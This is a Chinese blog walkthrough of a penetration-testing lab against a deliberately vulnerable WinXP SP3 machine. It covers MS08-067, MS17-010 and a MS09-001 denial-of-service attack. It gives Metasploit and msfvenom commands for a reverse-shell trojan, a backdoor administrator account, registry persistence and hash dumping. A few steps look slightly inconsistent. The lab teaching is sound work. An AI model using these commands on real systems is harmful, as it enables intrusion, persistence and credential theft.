---
title: 靶机：WinXPenSP3
author: 简文涛
categories:
  - 信息安全
tags:
  - 渗透测试
comments: true
top: false
abbrlink: 12470
date: 2020-06-03 09:40:02
updated:
summary: 这是《Metasploit渗透测试魔鬼训练营》中的靶机，包含MS08-067、MS17-010(永恒之蓝)、MS09-001等漏洞。
img: https://i.loli.net/2020/06/03/8UgmS2xVAsWOpQ7.png
permalink:
---

## WinXPenSP3靶机安装与配置

**靶机下载地址：**

下载链接：https://jwt1399.lanzous.com/iv2VJde68vc

**安装&配置：**

1.下载好压缩包解压，导入`VWware`，启动`WinXPenSP3`,登陆密码为123456

2.打开`Control Panel`-->`Network Connections`-->右击`Local Area Connection`-->选择`properties`-->双击`Internet Protocol(TCP/IP)`-->勾选`Obtain an IP address automatically`

3.将该靶机网络适配器改为桥接模式，你的攻击机也改为桥接模式，保证他俩能正常通信

## 环境

1.网络环境

| 机器              | IP            |
| ----------------- | ------------- |
| 攻击机：Kali-2020 | 192.168.1.110 |
| 靶    机：WinXP   | 192.168.1.102 |

2.主要使用工具

| 工具       | Version |
| ---------- | ------- |
| metasploit | 5.0.92  |
| nmap       | 7.80    |
| Nessus     | 8.10.0  |

## 目标&任务

1.探测靶机WinXPenSP3的漏洞&利用

2.利用漏洞Getshell

3.提权&持久化：增加Administrators权限用户，攻击机监听端口等待反弹shell，上传木马客服端程序，添加注册表信息，设置木马程序开机自启动等。

## 一、信息收集

### 1.探测目标

```bash
sudo arp-scan -l
```

![](../images/%E9%9D%B6%E6%9C%BA%EF%BC%9AWinXPenSP3/image-20200603105438832.png)

获得靶机IP: `192.168.1.102`

### 2.探测开放端口

```
nmap -sV -p- 192.168.1.102
```

![](../images/%E9%9D%B6%E6%9C%BA%EF%BC%9AWinXPenSP3/image-20200603110750442.png)

开放了端口`139，445`，这是`SMB协议`使用的端口，那么后面我们可以尝试使用nmap扫描smb相关漏洞

> 注：SMB协议是基于TCP－NETBIOS下的，一般端口使用为139，445

### 3.根据开放端口进一步获取信息

尝试通过SMB 协议确定操作系统、计算机名称、域、工作组和当前时间。

````bash
sudo nmap --script=smb-os-discovery.nse 192.168.1.102
````

![](../images/%E9%9D%B6%E6%9C%BA%EF%BC%9AWinXPenSP3/image-20200603110846003.png)



## 二、漏洞扫描

### 1.使用nmap扫描漏洞

```bash
sudo nmap --script=smb-check-vulns.nse 192.168.1.102
```

**直接执行会报错，因为新版Nmap，`smb-check-vulns.nse`脚本被取消了。**

它被分为`smb-vuln-conficker、smb-vuln-cve2009-3103、smb-vuln-ms06-025、smb-vuln-ms07-029、smb-vuln-regsvc-dos、smb-vuln-ms08-067`这六个脚本,用户根据需要选择对应的脚本。

**解决方案**

1.直接进行全扫描(执行上方6个脚本)

```bash
sudo nmap --script=smb-check-vulns-*.nse 192.168.1.102
```

2.获取smb-check-vulns.nse，放入`/usr/share/nmap/scripts/`【nmap存放漏洞匹配文件的目录】

smb-check-vulns.nse获取地址：https://jwt1399.lanzous.com/iYH7Wdg2k8j

![](../images/%E9%9D%B6%E6%9C%BA%EF%BC%9AWinXPenSP3/image-20200603112358613.png)

### 2.使用Nessus扫描漏洞

通过Nessus扫面的漏洞报告，对各个漏洞逐一利用。

![](../images/%E9%9D%B6%E6%9C%BA%EF%BC%9AWinXPenSP3/image-20200603191541811.png)

## 三、漏洞利用&提权

### MS08-067

#### MS08-067-漏洞利用

1）首先运行metasploit，使用search ms08-067寻找可利用的漏洞点

```bash
sudo msfdb init && msfconsole
search MS08-067
```

![](../images/%E9%9D%B6%E6%9C%BA%EF%BC%9AWinXPenSP3/image-20200603112805731.png)

2）使用攻击模块，使用show options查看我们需要设置的参数。

```bash
use exploit/windows/smb/ms08_067_netapi

show options #可以看到RHOSTS必须设置
```

![](../images/%E9%9D%B6%E6%9C%BA%EF%BC%9AWinXPenSP3/image-20200603113031684.png)

3）设置RHOSTS(远程IP),即靶机的ip，然后run或者exploit，成功Getshell

```bash
set RHOSTS 192.168.1.102
run 或者 exploit
shell
```

![](../images/%E9%9D%B6%E6%9C%BA%EF%BC%9AWinXPenSP3/image-20200603113343132.png)

#### MS08-067-提权

##### 添加Administrators权限用户

```bash
#添加hacker用户
net user hacker hacker /add

#添加hacker用户添加进administrators组
net localgroup administrators hacker /add

#查看用户
net user
#删除用户
net user hacker /delete  #渗透结束后再删除，擦干净屁股再走
```

![](../images/%E9%9D%B6%E6%9C%BA%EF%BC%9AWinXPenSP3/clip_image020.jpg)

可以看到成功添加了hacker用户

##### 制作&上传木马

###### 服务端

监听端口等待反弹shell。使用`exploit/multi/handler`模块,并设置参数之后运行。

```bash
use exploit/multi/handler     
```

![](../images/%E9%9D%B6%E6%9C%BA%EF%BC%9AWinXPenSP3/clip_image022.jpg)

```bash
set payload windows/meterpreter/reverse_tcp
show options
```

![](../images/%E9%9D%B6%E6%9C%BA%EF%BC%9AWinXPenSP3/clip_image024.jpg)

设置LHOST(本地IP，攻击机Kali的IP)和LPORT

```bash
set LHOST 192.168.1.110
set LPORT 12345   #也可以使用默认的4444端口
```

![](../images/%E9%9D%B6%E6%9C%BA%EF%BC%9AWinXPenSP3/clip_image026.jpg)

```bash
run 或者 exploit
```

![](../images/%E9%9D%B6%E6%9C%BA%EF%BC%9AWinXPenSP3/clip_image028.jpg)

这里先放着，不要关窗口，监听端口等待后面我们上传木马反弹shell

###### 客户端

使用msfvenom构造客户端木马程序，并上传

```bash
msfvenom -p windows/shell/reverse_tcp LHOST=192.168.1.110 LPORT=12345 -f exe -o jian.exe
```

![](../images/%E9%9D%B6%E6%9C%BA%EF%BC%9AWinXPenSP3/clip_image030.jpg)

利用上面漏洞将做好的木马植入靶机

```bash
sudo msfdb init && msfconsole
search ms08-067
use exploit/windows/smb/ms08_067_netapi
show options
set RHOSTS 192.168.1.102
Run
shell
```

使用upload上传木马

```bash
upload /home/kali/Desktop/jian.exe C:\\WINDOWS\\system32
```

![](../images/%E9%9D%B6%E6%9C%BA%EF%BC%9AWinXPenSP3/clip_image032.jpg)

![](../images/%E9%9D%B6%E6%9C%BA%EF%BC%9AWinXPenSP3/clip_image034.jpg)

可以看到jian.exe已经成功上传到靶机

在获取的shell上运行jian.exe，成功反弹shell到攻击机上【就是上面监听端口等待反弹shell的那个窗口】

![](../images/%E9%9D%B6%E6%9C%BA%EF%BC%9AWinXPenSP3/image-20200603120744598.png)

![](../images/%E9%9D%B6%E6%9C%BA%EF%BC%9AWinXPenSP3/clip_image038.jpg)

##### 设置木马开机启动

设置木马开机启动：利用注册表添加后门，先查看原开机启动的应用

```bash
reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\run
```

![](../images/%E9%9D%B6%E6%9C%BA%EF%BC%9AWinXPenSP3/clip_image040.jpg)

利用注册表增加开机启动应用,添加注册表信息，设置jian.exe开机自启。

```
reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v sys -d 'C:\WINDOWS\system32\jian.exe Ldp 443 -e cmd.exe'
```

![](../images/%E9%9D%B6%E6%9C%BA%EF%BC%9AWinXPenSP3/clip_image042.jpg)

#### 其他操作

还可以通过sysinfol来查看系统信息。

![](../images/%E9%9D%B6%E6%9C%BA%EF%BC%9AWinXPenSP3/clip_image044.jpg)

使用hashdump来查看系统用户名和密码的hash值，如果密码简单，可以通过爆破hash来得到登录密码。

![](../images/%E9%9D%B6%E6%9C%BA%EF%BC%9AWinXPenSP3/clip_image046.jpg)

对靶机发起了拒绝服务攻击

### MS17-010(永恒之蓝)

跟上面漏洞利用差不多

![](../images/%E9%9D%B6%E6%9C%BA%EF%BC%9AWinXPenSP3/clip_image002-1591158343850.jpg)

![](../images/%E9%9D%B6%E6%9C%BA%EF%BC%9AWinXPenSP3/clip_image004-1591158343851.jpg)

成功getshell，后续操作跟前面一样

### MS09-001

```
sudo msfdb init && msfconsole

Search MS09-001
```

![](../images/%E9%9D%B6%E6%9C%BA%EF%BC%9AWinXPenSP3/clip_image048.jpg)

```bash
use auxiliary/dos/windows/smb/ms09_001_write

show options

set RHOSTS 192.168.1.102

run 或者 exploit
```

![](../images/%E9%9D%B6%E6%9C%BA%EF%BC%9AWinXPenSP3/clip_image050.jpg)

![](../images/%E9%9D%B6%E6%9C%BA%EF%BC%9AWinXPenSP3/clip_image052.jpg)

对靶机发起了拒绝服务攻击,具体对靶机的影响暂时不知



 



## 赞助💰

如果你觉得对你有帮助，你可以赞助我一杯冰可乐！嘻嘻🤭

<table>
  <tbody>
     <tr>
         <td style="text-align:center;">支付宝支付</td>
         <td style="text-align:center;">微信支付</td>
     </tr>
   <tr>
    <td style="text-align:center;" ><img width="200" src="https://jwt1399.top/medias/reward/alipay.png"></td>    
      <td style="text-align:center;"><img width="200" src="https://jwt1399.top/medias/reward/wechat.png"></td>     
  </tr>
</tbody></table>